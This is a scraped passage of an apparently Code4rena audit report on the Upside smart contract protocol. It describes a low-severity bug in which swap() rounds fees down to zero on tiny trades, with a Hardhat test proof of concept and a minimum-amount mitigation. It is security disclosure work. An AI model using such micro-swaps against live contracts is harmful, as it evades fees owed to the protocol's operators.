<h2 style="position:relative;" id="03-swap-fee-bypass-via-small-trade-amounts"><a class="anchor before" aria-label="03 swap fee bypass via small trade amounts permalink" href="#03-swap-fee-bypass-via-small-trade-amounts"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[03] Swap fee bypass via small trade amounts</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229</a></p>
<h3 style="position:relative;" id="finding-description-1"><a class="anchor before" aria-label="finding description 1 permalink" href="#finding-description-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>swap()</code> function in the <code>UpsideProtocol</code> smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocolâ€™s fee logic.</p>
<pre data-index="7" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_isBuy</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// @dev On buy, the dynamic time fee is used</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">fee</span><span class="mtk1"> = (</span><span class="mtk12">_tokenAmount</span><span class="mtk1"> * </span><span class="mtk12">swapFeeBp</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenAmountAfterFee</span><span class="mtk1"> = </span><span class="mtk12">_tokenAmount</span><span class="mtk1"> - </span><span class="mtk12">fee</span><span class="mtk1">;</span></span></span></code></pre>
<p>This behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it createsâ€”users could automate micro-swaps to avoid fees entirely while still draining value from the system.</p>
<h3 style="position:relative;" id="impact-1"><a class="anchor before" aria-label="impact 1 permalink" href="#impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>No fees are collected on small trade size.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-2"><a class="anchor before" aria-label="recommended mitigation steps 2 permalink" href="#recommended-mitigation-steps-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Set a protocol-wide minimum input amount to reject trades too small to generate fees:</p>
<pre data-index="8" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   require(_amount &gt;= MIN_SWAP_AMOUNT, "Swap amount too small");</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-2"><a class="anchor before" aria-label="proof of concept 2 permalink" href="#proof-of-concept-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In <code>PoC.test.ts</code>, make the following modification:</li>
</ol>
<pre data-index="9" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // Add this import</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in <code>PoC.test.ts</code>:</li>
</ol>
<pre data-index="10" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it("should implement fee exemption for user1 during swap", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenizeFeeDestinationAddress = await owner.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _mintAmount = hhethers.parseUnits("100", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Set up a initial swap fee configuration</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const newFeeInfo = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeEnabled: true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeStartingBp: 100,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayInterval: 6,  // 6 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeFinalBp: 90,      // 0.9%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDeployerBp: 1000,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeSellBp: 100,       // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Set fee info:</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // mint user1 with liquidityToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.mint(await user1.getAddress(), _mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Verify user1 received the correct liquidity token balance</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Perform a swap with an extremely small input amount</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _tokenAmount = hhethers.parseUnits("0.000099", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).swap(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await sampleLinkToken.getAddress(),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      _tokenAmount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await user1.getAddress()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that user1 receives a non-zero amount of LINK tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LinkTokenBalance).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check that no protocol fees were collected from the swap</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
<p><em>Note: QA report issues deemed invalid by the judge have been removed for reporting purposes.</em></p>
<hr>
<h1 style="position:relative;" id="disclosures"><a class="anchor before" aria-label="disclosures permalink" href="#disclosures"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Disclosures</h1>
<p>C4 is an open organization governed by participants in the community.</p>
<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>
<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>
<style class="grvsc-styles">
  .grvsc-container {
    overflow: auto;
    position: relative;
    -webkit-overflow-scrolling: touch;
    padding-top: 1rem;
    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
    padding-bottom: 1rem;
    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
    border-radius: 8px;
    border-radius: var(--grvsc-border-radius, 8px);
    font-feature-settings: normal;
    line-height: 1.4;
  }
  
  .grvsc-code {
    display: table;
  }
  
  .grvsc-line {
    display: table-row;
    box-sizing: border-box;
    width: 100%;
    position: relative;
  }
  
  .grvsc-line > * {
    position: relative;
  }
  
  .grvsc-gutter-pad {
    display: table-cell;
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  .grvsc-gutter {
    display: table-cell;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter::before {
    content: attr(data-content);
  }
  
  .grvsc-source {
    display: table-cell;
    padding-left: 1.5rem;
    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
    padding-right: 1.5rem;
    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
  }
  
  .grvsc-source:empty::after {
    content: ' ';
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter + .grvsc-source {
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  /* Line transformer styles */
  
  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
    content: ' ';
    position: absolute;
    width: 100%;
  }
  
  .grvsc-line-diff-add::before {
    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
  }
  
  .grvsc-line-diff-del::before {
    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
  }
  
  .grvsc-line-number {
    padding: 0 2px;
    text-align: right;
    opacity: 0.7;
  }
  
  .dark-default-dark {
    background-color: #1E1E1E;
    color: #D4D4D4;
  }
  .dark-default-dark .mtk1 { color: #D4D4D4; }
  .dark-default-dark .mtk12 { color: #9CDCFE; }
  .dark-default-dark .mtk15 { color: #C586C0; }
  .dark-default-dark .mtk11 { color: #DCDCAA; }
  .dark-default-dark .mtk7 { color: #B5CEA8; }
  .dark-default-dark .mtk8 { color: #CE9178; }
  .dark-default-dark .mtk4 { color: #569CD6; }
  .dark-default-dark .mtk3 { color: #6A9955; }
  .dark-default-dark .grvsc-line-highlighted::before {
    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
  }
</style></div></div></div></div><button class="button floating-button" type="button">Top</button></div></main><footer class="footer limited-width"><ul class="footer__items"><li class="footer__item"><a href="https://twitter.com/code4rena" target="_blank" rel="noreferrer" aria-label="Twitter (Opens in new Window)">Twitter</a></li><li class="footer__item"><a href="https://discord.gg/code4rena" target="_blank" rel="noreferrer" aria-label="Discord (Opens in new Window)">Discord</a></li><li class="footer__item"><a href="https://github.com/code-423n4/" target="_blank" rel="noreferrer" aria-label="GitHub (Opens in new Window)">GitHub</a></li><li class="footer__item"><a href="https://github.com/code-423n4/media-kit" target="_blank" rel="noreferrer" aria-label="Media Kit (Opens in new Window)">Media kit</a></li></ul></footer></div><script src="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/9b7eb431f23ca42e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/media/b603571150b520e0-s.p.ttf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/ttf\"}]\n3:HL[\"/_next/static/media/d9396795aa5ec363-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"/_next/static/css/aa1e03632b0a9f00.css\",\"style\"]\n5:HL[\"/_next/static/css/9942e0cbde34320f.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"6:I[12846,[],\"\"]\n9:I[4707,[],\"\"]\nb:I[36423,[],\"\"]\nc:I[15718,[\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"3211\",\"static/chunks/app/reports/error-337d8165658cb655.js\"],\"default\"]\nf:I[61060,[],\"\"]\na:[\"slug\",\"2025-05-upside\",\"d\"]\n10:[]\n0:[\"$\",\"$L6\",null,{\"buildId\":\"BzWW4sxhuBIKztMBPk3l4\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"reports\",\"2025-05-upside\"],\"initialTree\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-upside\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-upside\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L7\",\"$L8\",null],null],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\",\"$a\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\"],\"error\":\"$c\",\"errorStyles\":[],\"errorScripts\":[],\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa1e03632b0a9f00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/9942e0cbde34320f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],\"$Ld\"],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Le\"],\"globalErrorComponent\":\"$f\",\"missingSlots\":\"$W10\"}]\n"])</script><script>self.__next_f.push([1,"11:I[36525,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"6686\",\"static/chunks/6686-dd6382cfde9e8708.js\",\"5813\",\"static/chunks/5813-7499623caf5cc29b.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"3185\",\"static/chunks/app/layout-bd3ec2013b0d95b1.js\"],\"default\"]\n12:I[75292,[\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"9160\",\"static/chunks/app/not-found-c0beac80bd3674ca.js\"],\"default\"]\n13:I[80319,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n14:I[39350,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chu"])</script><script>self.__next_f.push([1,"nks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n16:I[75899,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-db678ccd3d1e6084.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\nd:[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark __variable_145019 __variable_7d3254 __variable_38ceec\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L11\",null,{\"hasLoginHistory\":false,\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"$L12\",null,{}],\"notFoundStyles\":[]}]}]}]}]\n15:Tefe9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca 